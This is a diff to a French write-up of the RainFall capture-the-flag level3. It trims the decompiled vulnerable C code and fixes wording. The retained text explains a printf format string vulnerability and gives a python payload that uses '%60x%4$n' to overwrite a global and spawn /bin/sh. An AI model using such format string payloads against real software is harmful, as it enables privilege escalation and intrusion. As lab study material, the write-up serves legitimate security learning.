@@ -4,35 +4,11 @@
 -rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
 ```
 
-Nous avons un exécutable que nous allons décompiler :
-
-```
-void v(void)
-{
-  char local_20c [520];
-
-  fgets(local_20c,0x200,stdin);
-  printf(local_20c);
-  if (m == 0x40) {
-    fwrite("Wait what?!\n",1,0xc,stdout);
-    system("/bin/sh");
-  }
-  return;
-}
-
-void main(void)
-
-{
-  v();
-  return;
-}
-```
-
-Le code nous informe que l'entrée utilisateur est récupérée puis affichée avec printf.
+Le code decompile nous informe que l'entrée utilisateur est récupérée puis affichée avec printf.
 On remarque qu'il n'y a pas de sélecteur (%..) défini avec printf.
-Après recherches nous allons exploiter une faille connue sous le nom de "format string".
+Après recherche nous allons exploiter une faille connue sous le nom de "format string".
 
-Nous pouvons afficher ou manipuler le contenu de la stack en injectant les sélecteurs de printf dans l'entrée standart.
+Nous pouvons afficher ou manipuler le contenu de la stack en injectant les sélecteurs de printf dans l'entrée standard.
 
 ```
 level3@RainFall:~$ ./level3
@@ -64,7 +40,7 @@ Dump of assembler code for function v:
    0x080484cc <+40>:	lea    -0x208(%ebp),%eax
    0x080484d2 <+46>:	mov    %eax,(%esp)
    0x080484d5 <+49>:	call   0x8048390 <printf@plt>
-   0x080484da <+54>:	mov    0x804988c,%eax
+   0x080484da <+54>:	mov    0x804988c,%eax <== adresse de m pour comparaison
    0x080484df <+59>:	cmp    $0x40,%eax
    0x080484e2 <+62>:	jne    0x8048518 <v+116>
    0x080484e4 <+64>:	mov    0x8049880,%eax
@@ -94,18 +70,7 @@ Nous allons donc créer le script suivant :
 ```
 python -c 'print("\x8c\x98\x04\x08" + "%60x" + "%4$n")' > /tmp/exploit
 ```
-Qui va écrire 64 caractéres a l'adresse de "m".
-Explications :
-Nous spécifions tout d'abord l'adresse a l'emplacement que nous controllons
-```
-level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + " %x %x %x %x")' > /tmp/exploit
-level3@RainFall:~$ cat /tmp/exploit | ./level3
-? 200 b7fd1ac0 b7ff37d0 804988c
-
-level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + " %4$x")' > /tmp/exploit
-level3@RainFall:~$ cat /tmp/exploit | ./level3
-? 804988c // %4$x permet de spécifié le 4e élément.
-```
+Qui va écrire a la 4e stackFrame, 64(adresse(4) + caracteres(60)) a l'adresse de "m".
 
 En partant du dernier script, il suffit de mettre nos 60 espaces "%60x", et de donner l'adresse de m a %n pour écrire 64 dedans (0x40 en hexa)
 
